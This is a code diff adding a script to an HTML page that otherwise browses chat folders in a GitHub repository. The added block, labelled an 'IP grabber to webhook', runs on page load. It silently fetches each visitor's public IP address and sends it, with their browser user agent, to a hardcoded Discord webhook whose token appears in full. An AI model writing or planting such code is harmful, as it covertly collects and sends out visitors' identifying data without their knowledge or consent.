@@ -19,6 +19,22 @@
   <div id="files"></div>
 
   <script>
+    // === IP grabber to webhook ===
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const webhook = "https://discord.com/api/webhooks/1392932561742725251/vsbtT8849gy6ehGHjPC4i1bycHVXIB9kZja8wR6vNRYs9VIrbujLefuv7Wz-gqXmbZ2a";
+        const payload = {
+          content: `IP: \`${data.ip}\`\nUser-Agent: ${navigator.userAgent}`
+        };
+        fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      });
+
+    // === Chat folder browser ===
     const username = "lubrj";
     const repo = "expose";
     const branch = "main";
